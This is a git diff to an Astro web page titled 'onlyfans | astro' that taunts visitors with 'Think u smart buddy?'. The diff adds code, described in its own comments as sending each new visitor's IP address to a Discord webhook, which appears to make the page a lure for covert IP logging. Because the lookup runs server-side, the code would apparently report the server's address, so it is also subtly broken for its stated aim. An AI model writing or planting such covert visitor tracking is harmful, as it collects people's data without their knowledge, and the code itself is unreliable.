@@ -1,14 +1,41 @@
 ---
-import Container from "@/components/Container.astro"
-import Layout from "../layouts/Layout.astro"
-const ip = fetch('https://api.ipify.org?format=json')
+// src/pages/index.astro
+import Container from "@/components/Container.astro";
+import Layout from "../layouts/Layout.astro";
+
+// Function to send IP address to Discord webhook
+const sendToDiscord = async (ip: string) => {
+  const webhookUrl = import.meta.env.DISCORD_WEBHOOK_URL; // Replace with your Discord webhook URL
+
+  const message = {
+    content: `New visitor IP: ${ip}`,
+  };
+
+  try {
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(message),
+    });
+  } catch (error) {
+    console.error('Error sending IP to Discord:', error);
+  }
+};
+
+// Fetch IP address and send it to Discord
+const ipPromise = fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
-  .then(data => data.ip);
+  .then(data => {
+    sendToDiscord(data.ip);
+    return data.ip;
+  });
+
+const ip = await ipPromise;
 ---
 
-
 <Layout title="onlyfans | astro">
-  
   <Container>
     <div class="flex flex-col items-center justify-between text-center">
       <h1>Think u smart buddy?</h1>
